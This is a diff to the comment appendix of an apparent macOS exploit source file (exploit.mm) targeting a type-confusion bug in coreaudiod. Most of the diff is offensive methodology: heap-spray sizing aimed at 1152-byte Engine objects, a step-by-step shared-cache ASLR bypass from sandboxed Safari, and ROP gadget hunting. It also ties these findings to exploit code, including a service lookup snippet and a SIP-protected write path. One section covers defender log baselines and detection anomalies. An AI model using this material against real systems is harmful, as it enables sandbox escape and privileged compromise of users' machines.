@@ -17827,30 +17827,75 @@ int main(int argc, char *argv[]) {
  * B.3 CLEMENT LECIGNE PERSPECTIVE: DETECTION & FORENSICS
  * ═══════════════════════════════════════════════════════════════════════════
  *
- * EXPERIMENT: Monitor coreaudiod logs in real-time
- * PURPOSE: See what coreaudiod logs during normal operation
+ * ┌─────────────────────────────────────────────────────────────────────────┐
+ * │ EXPERIMENT 8: Monitor coreaudiod logs in real-time                     │
+ * └─────────────────────────────────────────────────────────────────────────┘
  *
+ * COMMAND:
  *   $ log show --predicate 'process == "coreaudiod"' --last 5m
  *
- * OUTPUT:
+ * WHY THIS COMMAND?
+ * ─────────────────
+ * macOS uses the "unified logging" system (introduced in macOS 10.12).
+ * All system logs go through this centralized system. The `log` command
+ * lets us query it.
+ *
+ * --predicate 'process == "coreaudiod"' filters for only coreaudiod logs.
+ * --last 5m shows the last 5 minutes.
+ *
+ * As a DEFENDER (Clement's perspective), we want to:
+ *   1. Understand what NORMAL looks like
+ *   2. Detect ANOMALIES that indicate exploitation
+ *
+ * OUTPUT (BASELINE - what normal looks like):
  *   ┌─────────────────────────────────────────────────────────────────────────┐
  *   │ 2026-01-31 04:34:20 coreaudiod: (BTAudioHALPlugin)                      │
  *   │   [BTAudio] BTHAL got kBTAudioMsgPropertyForegroundApp: <private>      │
+ *   │   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^      │
+ *   │   Bluetooth audio plugin checking which app is in foreground.          │
+ *   │   This is NORMAL - happens constantly when Bluetooth audio is used.    │
  *   │                                                                         │
  *   │ 2026-01-31 04:34:27 coreaudiod: (libAudioIssueDetector.dylib)          │
  *   │   [aid] RTAID [ use_case=Generic report_type=RMS ]                     │
  *   │   -- [ rms:[-51.4], peaks:[-37.2] ]                                    │
+ *   │   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^                                     │
+ *   │   Audio quality monitoring. RMS (loudness) and peak levels.            │
+ *   │   NORMAL - coreaudiod monitors audio quality continuously.             │
  *   │                                                                         │
- *   │ Normal logs show:                                                       │
- *   │   - Bluetooth audio plugin activity                                    │
- *   │   - Audio issue detection (RMS levels, peaks)                          │
- *   │   - No file operations or network activity                             │
+ *   │ WHAT'S NOTABLY ABSENT:                                                  │
+ *   │   - No file operation logs (open, write, create)                       │
+ *   │   - No network connection logs                                         │
+ *   │   - No process spawn logs                                              │
+ *   │   - No errors or crashes                                               │
  *   └─────────────────────────────────────────────────────────────────────────┘
  *
- * DETECTION: After exploitation, look for ABNORMAL logs:
- *   - File operations outside /Library/Preferences/Audio/
- *   - Network connections (coreaudiod shouldn't connect out)
- *   - Process spawning (coreaudiod shouldn't fork)
+ * DETECTION STRATEGY:
+ * ───────────────────
+ * Look for things that SHOULDN'T be there:
+ *
+ *   AFTER EXPLOITATION, you might see:
+ *
+ *   ┌─────────────────────────────────────────────────────────────────────────┐
+ *   │ ANOMALY                        │ What it means                          │
+ *   ├────────────────────────────────┼────────────────────────────────────────┤
+ *   │ Network connection from        │ Exploitation! coreaudiod normally     │
+ *   │ coreaudiod to external IP      │ doesn't initiate outbound connections │
+ *   │                                │ (except AirPlay, which has patterns)  │
+ *   │                                                                         │
+ *   │ File created in /tmp or        │ Post-exploitation staging. Attacker   │
+ *   │ other unexpected locations     │ may drop payloads or tools.           │
+ *   │                                                                         │
+ *   │ Child process spawned by       │ Definitely exploitation! coreaudiod   │
+ *   │ coreaudiod (fork/exec)         │ never spawns children normally.       │
+ *   │                                                                         │
+ *   │ Crash in _XIOContext_*         │ Failed exploitation attempt.          │
+ *   │ function                       │ Type confusion crash signature.       │
+ *   └─────────────────────────────────────────────────────────────────────────┘
+ *
+ * REAL-TIME MONITORING COMMAND:
+ *   $ log stream --predicate 'process == "coreaudiod"' --level debug
+ *
+ * This shows logs AS THEY HAPPEN. Good for watching an active attack.
  *
  * ─────────────────────────────────────────────────────────────────────────────
  *
@@ -17892,115 +17937,731 @@ int main(int argc, char *argv[]) {
  * B.4 BRANDON FALK PERSPECTIVE: HEAP ANALYSIS
  * ═══════════════════════════════════════════════════════════════════════════
  *
- * EXPERIMENT: Analyze coreaudiod heap allocations
- * PURPOSE: Understand memory layout for heap spray targeting
+ * This section is inspired by Brandon Falk's approach: understand the memory
+ * allocator at a DEEP level. You can't reliably exploit heap bugs without
+ * knowing how the heap actually works.
  *
+ * ┌─────────────────────────────────────────────────────────────────────────┐
+ * │ EXPERIMENT 9: Analyze coreaudiod heap allocations                      │
+ * └─────────────────────────────────────────────────────────────────────────┘
+ *
+ * COMMAND:
  *   $ sudo heap $(pgrep coreaudiod)
  *
- * OUTPUT:
+ * WHY THIS COMMAND?
+ * ─────────────────
+ * The "heap" command is macOS's built-in heap analysis tool. It reads a
+ * process's memory and categorizes all malloc allocations by:
+ *   - Size class (how big each allocation is)
+ *   - Object type (Objective-C class or "non-object")
+ *   - Count (how many of each)
+ *
+ * WHY do we need "sudo"?
+ *   coreaudiod runs as user _coreaudiod, not us. Reading another process's
+ *   memory requires root privileges. "$(pgrep coreaudiod)" gets its PID.
+ *
+ * WHY is this important for exploitation?
+ *   1. HEAP SPRAY TARGETING: We need allocations the SAME SIZE as the
+ *      vulnerable object (Engine = 1152 bytes). If we spray different
+ *      sizes, our data won't land where the Engine is allocated.
+ *
+ *   2. HOLE CREATION: malloc reuses freed memory. We need to understand
+ *      what's already in the heap to create "holes" of the right size.
+ *
+ *   3. RELIABILITY: Blind spraying is unreliable. Understanding the heap
+ *      lets us PREDICT where our data lands.
+ *
+ * OUTPUT (with detailed line-by-line analysis):
  *   ┌─────────────────────────────────────────────────────────────────────────┐
  *   │ Process:         coreaudiod [188]                                       │
  *   │ Physical footprint:         21.6M                                       │
  *   │ Physical footprint (peak):  42.4M                                       │
+ *   │ ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^                                     │
+ *   │ "Physical footprint" = actual RAM used (not virtual address space).     │
+ *   │ 21.6MB is relatively small. Peak of 42.4MB suggests some large          │
+ *   │ temporary allocations happened and were freed.                          │
  *   │                                                                         │
  *   │ Process 188: 4 zones                                                    │
+ *   │ ^^^^^^^^^^^^^^^^^^^^^^^^                                                │
+ *   │ macOS malloc uses "zones" to organize allocations. Each zone manages    │
+ *   │ different size classes:                                                 │
+ *   │   - MALLOC_TINY: 16 to 1008 bytes (16-byte quantum)                    │
+ *   │   - MALLOC_SMALL: 1009 to 127KB (512-byte quantum)                     │
+ *   │   - MALLOC_MEDIUM: 127KB to 1MB                                        │
+ *   │   - MALLOC_LARGE: > 1MB (mmap'd directly)                              │
+ *   │                                                                         │
+ *   │ Engine objects (1152 bytes) go to MALLOC_SMALL!                        │
  *   │                                                                         │
  *   │ All zones: 73602 nodes malloced                                        │
+ *   │ ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^                                     │
+ *   │ 73,602 individual allocations. This is a LOT!                          │
+ *   │ Complex heap state = harder to predict, but we can still succeed       │
+ *   │ with enough spray volume.                                              │
+ *   │                                                                         │
  *   │   Sizes: 3280KB[1] 848KB[1] 752KB[2] 336KB[4] 192KB[5]                 │
  *   │          1KB[238] 896[141] 768[371] 640[253] 512[310]                  │
+ *   │          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^                │
+ *   │ FORMAT: size[count]                                                    │
+ *   │                                                                         │
+ *   │ Reading: "1KB[238]" means 238 allocations of 1024 bytes (1KB)          │
+ *   │          "896[141]" means 141 allocations of 896 bytes                 │
+ *   │                                                                         │
+ *   │ CRITICAL OBSERVATION:                                                  │
+ *   │ No "1152[X]" entry! This means Engine objects (1152 bytes) are RARE.  │
+ *   │ When we create an Engine, malloc will pull from MALLOC_SMALL.          │
+ *   │ If we pre-fill MALLOC_SMALL with our controlled data, the Engine       │
+ *   │ inherits our data when allocated!                                      │
+ *   │                                                                         │
  *   │          384[456] 320[365] 256[401] 224[1149] 192[4241]                │
  *   │          160[847] 128[1946] 112[2429] 96[5386] 80[8510]                │
  *   │          64[4986] 48[12337] 32[15432] 16[12062]                        │
+ *   │          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^                   │
+ *   │ Small allocations dominate. 32 bytes has 15,432 allocations!           │
+ *   │ These are Objective-C objects, strings, small buffers, etc.            │
  *   │                                                                         │
  *   │ Top allocations:                                                        │
  *   │   COUNT      BYTES       AVG   CLASS_NAME                              │
  *   │   44220   22030288     498.2   non-object                              │
+ *   │   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^                                         │
+ *   │ "non-object" = raw C allocations (not Objective-C).                    │
+ *   │ 44,220 allocations averaging 498 bytes each.                           │
+ *   │ These are the bulk of heap usage.                                      │
+ *   │                                                                         │
  *   │    5487     301760      55.0   CFString                                │
+ *   │    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^                                       │
+ *   │ CFString = Core Foundation strings.                                    │
+ *   │ IMPORTANT: plist deserialization creates CFStrings!                    │
+ *   │ When we spray via SetPropertyData with plist strings,                  │
+ *   │ malloc creates CFStrings for each string value.                        │
+ *   │                                                                         │
  *   │    2045      98160      48.0   NSMutableArray                          │
  *   │    1208      38656      32.0   NSMutableDictionary                     │
+ *   │    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^                      │
+ *   │ plist arrays and dictionaries. Each nested array in our spray          │
+ *   │ creates one of these.                                                  │
+ *   │                                                                         │
  *   │     774      99072     128.0   dispatch_queue_t (serial)               │
  *   │     688      55040      80.0   dispatch_semaphore_t                    │
+ *   │     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^                     │
+ *   │ GCD (Grand Central Dispatch) objects. coreaudiod uses lots of          │
+ *   │ async operations for audio processing.                                 │
  *   └─────────────────────────────────────────────────────────────────────────┘
  *
- * INSIGHT FOR HEAP SPRAY:
- *   - 73,602 total allocations = complex heap state
- *   - CFString (5487 allocations) = plist strings end up here
- *   - Target size class: 1152 bytes (Engine object size)
- *   - Need to spray enough to fill that size class
+ * THE KEY INSIGHT FOR EXPLOITATION:
+ * ─────────────────────────────────
+ * We want to spray 1152-byte chunks. Engine objects are 1152 bytes.
+ *
+ *   1. We send plist with strings of ~1100 bytes
+ *   2. CFString allocates ~1152 bytes (string + header + alignment)
+ *   3. These go to MALLOC_SMALL zone
+ *   4. We free some to create "holes"
+ *   5. When Engine is created, it gets a "hole" with our data
+ *   6. Engine's offset 0x68 inherits our controlled pointer
+ *
+ * ANALOGY - "The Parking Lot":
+ *   Think of MALLOC_SMALL as a parking lot with spots for 1152-byte cars.
+ *   - We fill many spots with OUR cars (spray)
+ *   - We remove some of our cars (free) to create empty spots
+ *   - When a new car (Engine) arrives, it parks in one of OUR old spots
+ *   - That spot still has our stuff on the ground (controlled data)
+ *
+ * HEAP SPRAY CALCULATION:
+ * ───────────────────────
+ *   Target: 1152-byte allocations
+ *   String content size: ~1100 bytes (leaves room for CFString header)
+ *   Strings per spray iteration: 50
+ *   Iterations: 100
+ *   Total spray allocations: 5000
+ *   Total spray size: ~5.75 MB
+ *
+ *   If 10% of slots are "holes" = 500 controlled holes
+ *   If we create 10 Engine objects, ~1 should land in our spray
+ *   That's why we try multiple times!
  *
  * ─────────────────────────────────────────────────────────────────────────────
  *
- * EXPERIMENT: View coreaudiod memory map
- * PURPOSE: Find dyld shared cache base for ROP calculation
+ * ┌─────────────────────────────────────────────────────────────────────────┐
+ * │ EXPERIMENT 10: View coreaudiod memory map                              │
+ * └─────────────────────────────────────────────────────────────────────────┘
  *
+ * COMMAND:
  *   $ sudo vmmap $(pgrep coreaudiod) | grep -E "dyld|CoreAudio|malloc"
  *
- * OUTPUT:
+ * WHY THIS COMMAND?
+ * ─────────────────
+ * "vmmap" shows the VIRTUAL MEMORY MAP of a process - every memory region,
+ * what it's for, and what permissions it has. This is essential for:
+ *
+ *   1. ASLR UNDERSTANDING: Where did libraries load?
+ *   2. ROP GADGET ADDRESSES: Gadgets need correct base addresses
+ *   3. HEAP LOCATION: Where does malloc put our spray?
+ *   4. PROTECTION BITS: What memory is executable vs. writable?
+ *
+ * We grep for "dyld", "CoreAudio", and "malloc" because:
+ *   - "dyld shared cache" = where ALL system libraries live (including gadgets)
+ *   - "CoreAudio" = the vulnerable library we're analyzing
+ *   - "malloc" = heap regions where our spray lands and Engine is allocated
+ *
+ * OUTPUT (with detailed analysis):
  *   ┌─────────────────────────────────────────────────────────────────────────┐
  *   │ Region                  Start-End               Size   Prot            │
  *   ├─────────────────────────────────────────────────────────────────────────┤
  *   │ __TEXT CoreAudio        18e219000-18e9c5000    7856K   r-x             │
- *   │   └── CoreAudio.framework loaded here                                  │
+ *   │ ^^^^^^ ^^^^^^^^^        ^^^^^^^^^^^^^^^^^       ^^^^   ^^^             │
+ *   │   │       │                    │                  │     │              │
+ *   │   │       │                    │                  │     └─ r-x = Read,│
+ *   │   │       │                    │                  │        no Write,  │
+ *   │   │       │                    │                  │        eXecute    │
+ *   │   │       │                    │                  │                    │
+ *   │   │       │                    │                  └─ 7.8 MB of code   │
+ *   │   │       │                    │                                       │
+ *   │   │       │                    └─ Virtual address range                │
+ *   │   │       │                       (0x18e219000 to 0x18e9c5000)        │
+ *   │   │       │                                                            │
+ *   │   │       └─ "CoreAudio" = the framework we extracted and analyzed    │
+ *   │   │                                                                    │
+ *   │   └─ "__TEXT" = executable code section                               │
+ *   │                                                                         │
+ *   │ WHY THIS MATTERS:                                                      │
+ *   │ ROP gadgets are in __TEXT sections (executable code).                 │
+ *   │ Address 0x18e219000 is the SLIDE-ADJUSTED base.                       │
+ *   │ To calculate a gadget's runtime address:                               │
+ *   │   runtime_addr = file_offset + slide_base                             │
  *   │                                                                         │
  *   │ dyld shared cache       20a53c000-22f2b8000    589.5M  r--             │
- *   │   └── Combined __LINKEDIT for all system libraries                    │
+ *   │ ^^^^^^^^^^^^^^^^^^      ^^^^^^^^^^^^^^^^^       ^^^^^^   ^^^           │
+ *   │                                                                         │
+ *   │ This is the BIG ONE. On modern macOS, Apple combined ALL system       │
+ *   │ libraries into a single 589MB region. This is the "dyld shared cache".│
+ *   │                                                                         │
+ *   │ CRITICAL SECURITY INSIGHT:                                             │
+ *   │ The dyld shared cache is loaded at the SAME address in ALL processes  │
+ *   │ on a given boot. Apple uses "shared cache ASLR" but the slide is      │
+ *   │ SYSTEM-WIDE, not per-process.                                         │
+ *   │                                                                         │
+ *   │ WHY? Performance. The kernel maps the same physical pages into all    │
+ *   │ processes. If each process had a different slide, they couldn't share │
+ *   │ physical memory, wasting gigabytes of RAM.                            │
+ *   │                                                                         │
+ *   │ EXPLOITATION CONSEQUENCE:                                              │
+ *   │ If we know the slide in OUR process (attacker-controlled Safari),     │
+ *   │ we know the slide in coreaudiod! Just read a pointer from a known     │
+ *   │ location in our own process, calculate the slide, and use that        │
+ *   │ for ROP gadget addresses in coreaudiod.                               │
  *   │                                                                         │
  *   │ MALLOC_TINY             104d94000-105194000    4096K   rw-             │
- *   │   └── DefaultMallocZone - small allocations                            │
+ *   │ ^^^^^^^^^^^             ^^^^^^^^^^^^^^^^^       ^^^^   ^^^             │
+ *   │                                                                         │
+ *   │ MALLOC_TINY = heap zone for small allocations (16-1008 bytes).        │
+ *   │ "rw-" = readable + writable, NOT executable.                          │
+ *   │                                                                         │
+ *   │ This is where many of our spray allocations land (for small strings). │
+ *   │ The 4MB size means there's room for many allocations.                 │
  *   │                                                                         │
  *   │ MALLOC metadata         104a9c000-104ae4000    288K    rw-             │
- *   │   └── DefaultMallocZone zone structure                                 │
+ *   │ ^^^^^^^^^^^^^^^                                                        │
+ *   │ malloc keeps bookkeeping structures (free lists, zone info) here.     │
+ *   │ Corrupting this = potential code execution (but harder).              │
  *   └─────────────────────────────────────────────────────────────────────────┘
  *
- * INSIGHT FOR ASLR:
- *   - CoreAudio at 0x18e219000 (in dyld shared cache region)
- *   - dyld shared cache __LINKEDIT at 0x20a53c000
- *   - MALLOC_TINY zone at 0x104d94000 (4MB region)
- *   - These addresses are CONSISTENT across all processes on same boot
- *   - Know your process's layout → know coreaudiod's layout!
+ * UNDERSTANDING ASLR ON macOS:
+ * ────────────────────────────
+ * macOS has MULTIPLE ASLR mechanisms:
+ *
+ *   1. DYLD SHARED CACHE SLIDE (system-wide):
+ *      - Random at boot time
+ *      - SAME for all processes until reboot
+ *      - ~256 possible positions (low entropy!)
+ *      - Can leak from own process → know target's addresses
+ *
+ *   2. PIE (Position Independent Executable):
+ *      - Each process's main binary loads at random address
+ *      - Independent per-process
+ *      - But coreaudiod's code is IN the shared cache, so #1 applies
+ *
+ *   3. STACK ASLR:
+ *      - Stack starts at random address per process
+ *      - Independent per-process
+ *      - Matters for stack pivots
+ *
+ *   4. HEAP ASLR:
+ *      - malloc zones at random addresses
+ *      - Independent per-process
+ *      - For heap spray, we don't need exact address - just fill the zone!
+ *
+ * PRACTICAL ASLR BYPASS:
+ * ──────────────────────
+ *   STEP 1: In attacker's Safari (sandboxed), read a pointer from
+ *           the dyld shared cache (any global variable works).
+ *
+ *   STEP 2: Subtract the "expected" offset (from our binary analysis)
+ *           to get the cache slide.
+ *
+ *   STEP 3: Add slide to our ROP gadget offsets → correct runtime addresses.
+ *
+ *   STEP 4: These addresses work in coreaudiod too! (Same slide)
+ *
+ * VMMAP REGIONS WE DIDN'T GREP:
+ * ─────────────────────────────
+ *   Full vmmap output has ~200 regions including:
+ *   - __DATA segments (writable globals)
+ *   - __OBJC segments (Objective-C metadata)
+ *   - Stack regions
+ *   - Memory-mapped files
+ *   - Kernel-shared regions
+ *   - Guard pages (unmapped, to catch buffer overflows)
  *
  * ═══════════════════════════════════════════════════════════════════════════
  * B.5 COMBINED WORKFLOW: PUTTING IT ALL TOGETHER
  * ═══════════════════════════════════════════════════════════════════════════
  *
- * COMPLETE ANALYSIS WORKFLOW:
+ * Now we connect all the experiments into a coherent methodology. Each step
+ * builds on the previous one. This is the SYSTEMATIC APPROACH to vulnerability
+ * research that separates methodical researchers from random bug hunters.
+ *
+ * COMPLETE ANALYSIS WORKFLOW (With Rationale):
  *
  *   ┌─────────────────────────────────────────────────────────────────────────┐
- *   │ STEP 1: Understand the target                                           │
- *   │ ─────────────────────────────────                                       │
+ *   │ PHASE 1: RECONNAISSANCE - UNDERSTAND THE TARGET                         │
+ *   │ ════════════════════════════════════════════════                        │
+ *   │                                                                         │
+ *   │ GOAL: Before touching binaries, understand what we're attacking.       │
+ *   │                                                                         │
  *   │   $ sudo launchctl print system/com.apple.audio.coreaudiod             │
+ *   │   ├── Q: Is it running? As what user? What services does it expose?   │
+ *   │   └── A: Running as _coreaudiod, exposes com.apple.audio.audiohald    │
+ *   │                                                                         │
  *   │   $ codesign -d --entitlements - /usr/sbin/coreaudiod                  │
+ *   │   ├── Q: What special privileges does it have?                         │
+ *   │   └── A: Can write to SIP-protected Audio directory, access DriverKit │
+ *   │                                                                         │
  *   │   $ cat /System/Library/Sandbox/Profiles/com.apple.audio.coreaudiod.sb │
+ *   │   ├── Q: Is it sandboxed? What CAN'T it do?                            │
+ *   │   └── A: Sandboxed but (allow network*) = full network access!        │
  *   │                                                                         │
- *   │ STEP 2: Extract and analyze binary                                      │
- *   │ ───────────────────────────────────                                     │
- *   │   $ ipsw dyld extract <cache> CoreAudio -o /tmp/extracted              │
+ *   │ WHY THIS ORDER?                                                         │
+ *   │ Understanding privileges BEFORE exploitation tells us what we'll       │
+ *   │ gain if we succeed. No point exploiting a fully sandboxed daemon       │
+ *   │ that can't do anything useful. coreaudiod CAN do useful things!       │
+ *   │                                                                         │
+ *   ├─────────────────────────────────────────────────────────────────────────┤
+ *   │ PHASE 2: BINARY EXTRACTION - GET THE CODE                               │
+ *   │ ═════════════════════════════════════════════                           │
+ *   │                                                                         │
+ *   │ GOAL: Extract analyzable binaries from dyld shared cache.              │
+ *   │                                                                         │
+ *   │   $ brew install blacktop/tap/ipsw                                     │
+ *   │   ├── Q: How do I get ipsw?                                            │
+ *   │   └── A: It's a Go tool, Homebrew has a tap from the author           │
+ *   │                                                                         │
+ *   │   $ ipsw dyld extract <cache_path> CoreAudio -o /tmp/extracted         │
+ *   │   ├── Q: How do I get CoreAudio.framework out of the cache?            │
+ *   │   └── A: ipsw extracts individual libraries from the monolithic cache │
+ *   │                                                                         │
  *   │   $ nm /tmp/extracted/CoreAudio | grep HALS                            │
+ *   │   ├── Q: What classes/functions exist in the audio server?             │
+ *   │   └── A: HALS_Object hierarchy: IOContext, Engine, Stream, etc.       │
+ *   │                                                                         │
  *   │   $ nm /tmp/extracted/CoreAudio | grep __X                             │
+ *   │   ├── Q: What MIG handlers can I send messages to?                     │
+ *   │   └── A: 79 handlers! __XIOContext_Fetch_Workgroup_Port is vulnerable │
  *   │                                                                         │
- *   │ STEP 3: Find gadgets                                                    │
- *   │ ────────────────────────                                                │
+ *   │ WHY nm AND NOT DISASSEMBLER?                                            │
+ *   │ nm is FAST. Running IDA or Ghidra on a 7MB binary is slow. Start with │
+ *   │ nm to identify interesting functions, THEN disassemble those specific  │
+ *   │ functions. Work smarter, not harder.                                   │
+ *   │                                                                         │
+ *   ├─────────────────────────────────────────────────────────────────────────┤
+ *   │ PHASE 3: GADGET COLLECTION - BUILD THE TOOLKIT                          │
+ *   │ ═══════════════════════════════════════════════                         │
+ *   │                                                                         │
+ *   │ GOAL: Find ROP gadgets for building our payload.                       │
+ *   │                                                                         │
+ *   │   $ pip3 install ROPGadget                                             │
  *   │   $ ROPgadget --binary /tmp/extracted/CoreAudio > gadgets.txt          │
- *   │   $ grep "add sp" gadgets.txt                                          │
- *   │   $ grep "ret$" gadgets.txt                                            │
+ *   │   ├── Q: What code snippets can I chain together?                      │
+ *   │   └── A: 26,923 gadgets! Plenty to work with.                         │
  *   │                                                                         │
- *   │ STEP 4: Analyze heap for spray parameters                               │
- *   │ ──────────────────────────────────────────                              │
+ *   │   $ grep "add sp" gadgets.txt    # Stack adjustment gadgets            │
+ *   │   $ grep "pop rdi" gadgets.txt   # Register control gadgets (x86)     │
+ *   │   $ grep "ldr x0" gadgets.txt    # Register control gadgets (ARM64)   │
+ *   │   $ grep "ret$" gadgets.txt      # Plain returns (no PAC)             │
+ *   │                                                                         │
+ *   │ WHY GREP THE GADGET FILE?                                              │
+ *   │ ROPgadget outputs thousands of gadgets. We need SPECIFIC types:        │
+ *   │   - Stack pivots: xchg rsp, rax (x86) or mov sp, x0 (ARM64)           │
+ *   │   - Register setters: pop rdi (x86) or ldr x0 (ARM64)                 │
+ *   │   - Memory operations: mov [rdi], rax                                  │
+ *   │ Searching for patterns is faster than scrolling through 26K lines.    │
+ *   │                                                                         │
+ *   ├─────────────────────────────────────────────────────────────────────────┤
+ *   │ PHASE 4: HEAP PROFILING - KNOW YOUR BATTLEFIELD                         │
+ *   │ ════════════════════════════════════════════════                        │
+ *   │                                                                         │
+ *   │ GOAL: Understand heap state for reliable exploitation.                 │
+ *   │                                                                         │
  *   │   $ sudo heap $(pgrep coreaudiod)                                      │
- *   │   $ sudo vmmap $(pgrep coreaudiod) | grep MALLOC                       │
+ *   │   ├── Q: What size allocations dominate? What size is rare?            │
+ *   │   └── A: 73K allocations. 1152-byte (Engine size) is rare = good!     │
  *   │                                                                         │
- *   │ STEP 5: Set up detection (for blue team)                                │
- *   │ ─────────────────────────────────────────                               │
+ *   │   $ sudo vmmap $(pgrep coreaudiod) | grep MALLOC                       │
+ *   │   ├── Q: Where is the heap? How big are the zones?                     │
+ *   │   └── A: MALLOC_TINY at 0x104d94000, 4MB. MALLOC_SMALL nearby.        │
+ *   │                                                                         │
+ *   │   $ sudo vmmap $(pgrep coreaudiod) | grep dyld                         │
+ *   │   ├── Q: What's the dyld cache slide for ASLR bypass?                  │
+ *   │   └── A: Cache at 0x20a53c000, same as our process (system-wide!)     │
+ *   │                                                                         │
+ *   │ WHY HEAP ANALYSIS?                                                      │
+ *   │ Blind heap spraying is unreliable. If we spray the WRONG size,        │
+ *   │ our data goes to a different zone than the vulnerable object.          │
+ *   │ Understanding malloc zones lets us TARGET the right region.            │
+ *   │                                                                         │
+ *   ├─────────────────────────────────────────────────────────────────────────┤
+ *   │ PHASE 5: DETECTION SETUP - BLUE TEAM PERSPECTIVE                        │
+ *   │ ═════════════════════════════════════════════════                       │
+ *   │                                                                         │
+ *   │ GOAL: Monitor for exploitation (defenders) or verify success (red).    │
+ *   │                                                                         │
  *   │   $ log stream --predicate 'process == "coreaudiod"'                   │
+ *   │   ├── DETECT: Unusual log messages, errors, crashes                    │
+ *   │   └── BASELINE: Learn what "normal" looks like first                   │
+ *   │                                                                         │
  *   │   $ sudo fs_usage -w -f filesys | grep Audio                           │
+ *   │   ├── DETECT: Large writes to DeviceSettings.plist (heap spray!)       │
+ *   │   └── DETECT: File creation outside normal paths                       │
+ *   │                                                                         │
  *   │   $ watch -n 1 'ls -la /Library/Preferences/Audio/'                    │
+ *   │   ├── DETECT: File size changes (plist growing during spray)           │
+ *   │   └── DETECT: New files appearing (exploit artifacts)                  │
+ *   │                                                                         │
+ *   │ WHY DETECTION AS FINAL STEP?                                           │
+ *   │ For attackers: Verify your exploit worked                              │
+ *   │ For defenders: Know what to look for in production systems             │
+ *   │ Understanding BOTH sides makes you a better security professional.     │
  *   └─────────────────────────────────────────────────────────────────────────┘
  *
+ * THE COMPLETE PICTURE:
+ * ─────────────────────
+ *
+ *   ┌────────────────────────────────────────────────────────────────────────┐
+ *   │                                                                        │
+ *   │  RECONNAISSANCE        EXTRACTION         GADGETS         HEAP        │
+ *   │  ┌──────────┐         ┌──────────┐       ┌──────────┐   ┌──────────┐ │
+ *   │  │ launchctl│  ───►   │   ipsw   │  ───► │ROPgadget │ ─►│   heap   │ │
+ *   │  │ codesign │         │    nm    │       │  grep    │   │  vmmap   │ │
+ *   │  │ sandbox  │         │          │       │          │   │          │ │
+ *   │  └──────────┘         └──────────┘       └──────────┘   └──────────┘ │
+ *   │       │                    │                  │              │        │
+ *   │       ▼                    ▼                  ▼              ▼        │
+ *   │  Know privileges      Know structure     Know code        Know heap  │
+ *   │  and constraints      and entry points   snippets         layout     │
+ *   │                                                                        │
+ *   │  ┌─────────────────────────────────────────────────────────────────┐  │
+ *   │  │                                                                 │  │
+ *   │  │  COMBINE ALL → BUILD EXPLOIT → TEST → REFINE → SUCCESS!       │  │
+ *   │  │                                                                 │  │
+ *   │  └─────────────────────────────────────────────────────────────────┘  │
+ *   │                                                                        │
+ *   └────────────────────────────────────────────────────────────────────────┘
+ *
  * TOOLS USED IN THIS APPENDIX:
- *   - ipsw: brew install blacktop/tap/ipsw
- *   - ROPgadget: pip3 install ROPGadget
- *   - radare2: brew install radare2
- *   - class-dump: brew install --cask class-dump (or from nygard/class-dump)
+ * ────────────────────────────
+ *   TOOL          INSTALL                              PURPOSE
+ *   ────          ───────                              ───────
+ *   ipsw          brew install blacktop/tap/ipsw       Extract from dyld cache
+ *   ROPgadget     pip3 install ROPGadget               Find ROP gadgets
+ *   nm            (built-in)                           List symbols
+ *   heap          (built-in)                           Analyze heap allocations
+ *   vmmap         (built-in)                           View memory map
+ *   codesign      (built-in)                           View entitlements
+ *   launchctl     (built-in)                           Query launchd services
+ *   log           (built-in)                           Query unified logging
+ *   fs_usage      (built-in)                           Monitor file operations
+ *
+ *   OPTIONAL (for deeper analysis):
+ *   radare2       brew install radare2                 Disassembly/debugging
+ *   Ghidra        ghidra.re                            Decompilation
+ *   class-dump    brew install class-dump              Dump ObjC headers
+ *   ropper        pip3 install ropper                  Alternative gadget finder
+ *
+ * ═══════════════════════════════════════════════════════════════════════════
+ * B.6 CONNECTING EXPERIMENTS TO EXPLOIT CODE
+ * ═══════════════════════════════════════════════════════════════════════════
+ *
+ * This section maps each experiment's findings to SPECIFIC lines of code in
+ * the exploit. The goal is to show that every piece of information we gathered
+ * has a CONCRETE purpose in exploitation.
+ *
+ * ┌─────────────────────────────────────────────────────────────────────────────┐
+ * │ EXPERIMENT OUTPUT  →  WHERE IT'S USED IN THE EXPLOIT                        │
+ * └─────────────────────────────────────────────────────────────────────────────┘
+ *
+ * ┌─────────────────────────────────────────────────────────────────────────────┐
+ * │ EXPERIMENT 1: launchctl print                                               │
+ * │                                                                             │
+ * │ FINDING: Service name is "com.apple.audio.audiohald"                       │
+ * │                                                                             │
+ * │ USED IN exploit.mm (this file), in the connectToAudioHAL() function:       │
+ * │                                                                             │
+ * │   // Connect to the audiohald service                                      │
+ * │   mach_port_t service_port;                                                │
+ * │   kern_return_t kr = bootstrap_look_up(                                    │
+ * │       bootstrap_port,                                                       │
+ * │       "com.apple.audio.audiohald",  // <-- FROM EXPERIMENT 1!              │
+ * │       &service_port                                                         │
+ * │   );                                                                        │
+ * │                                                                             │
+ * │ WITHOUT THIS: We wouldn't know what service name to look up.               │
+ * │ The Mach port lookup requires the EXACT registered name.                   │
+ * └─────────────────────────────────────────────────────────────────────────────┘
+ *
+ * ┌─────────────────────────────────────────────────────────────────────────────┐
+ * │ EXPERIMENT 2: codesign entitlements                                         │
+ * │                                                                             │
+ * │ FINDING: "rootless.storage.AudioSettings" entitlement                      │
+ * │                                                                             │
+ * │ IMPLICATION: After exploitation, we can write to SIP-protected paths!      │
+ * │                                                                             │
+ * │ USED IN build_rop.py, choosing the file path for our proof-of-concept:     │
+ * │                                                                             │
+ * │   INLINE_STRING = "/Library/Preferences/Audio/malicious.txt"               │
+ * │                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^               │
+ * │   This path is SIP-protected for normal users, but coreaudiod              │
+ * │   has the entitlement to write here. We leverage that capability!          │
+ * │                                                                             │
